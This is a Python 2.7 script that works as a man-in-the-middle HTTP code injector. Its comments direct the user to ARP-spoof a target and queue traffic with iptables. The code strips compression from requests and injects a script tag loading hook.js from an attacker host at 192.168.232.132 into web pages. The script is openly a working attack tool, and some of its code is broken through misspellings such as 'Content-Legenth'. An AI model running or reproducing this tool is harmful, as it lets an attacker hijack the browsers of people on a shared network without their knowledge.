#!/usr/bin/env python

#File intercepter and code injector program python 2.7
#this will edit the contents of the RAW layer of the packet

#run ARP Spoof to get in the middle
#iptables -I OUTPUT -j NFQUEUE --queue-num 0 this creats a queue for the packets
#iptables -I OUTPUT -j INPUT --queue-num 0 this creats a queue for the packets for your own PC
#chage to -j FOWARD id you are attacking anohter computher
#iptables --flush when done
#run before using program

import netfilterqueue
import scapy.all as scapy
import re #re is the regex libary


def set_load(packet, load):
    # insert new code here to replace download
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    # do this anytime modfying pakcets
    return packet



def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.RAW): #RAW is the raw layer of the packet
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80: #port #80 is for http
            print("[+] Request")
            load = re.sub("Accept-Encoding.*?\\r\\n", "", load) #gets the web server to send plain text html code

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Responce")
            injection_code = '<script src="http://192.168.232.132:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_legenth_search = re.search("(?:Content-Legenth:\s)(\d*)", load) #?: means it isnt gonna include it in captured regex
            if content_legenth_search and "text/html" in load:
                content_legenth = content_legenth_search.group(1) #group 0 is the second thing it matches aka the content legenth aka (\d*)
                new_content_legenth = int(content_legenth) + len(injection_code) #setting new content legenth
                load = load.replace(content_legenth, str(new_content_legenth)) #setting new content legenth to the load

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet)) #sets the payload of the modified packet

    packet.accept() #fowards packet to target

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #connects the queue in the program to the queue in the terminal
#The 0 is the set num for the que instance, process_packet is a callback funtion
queue.run()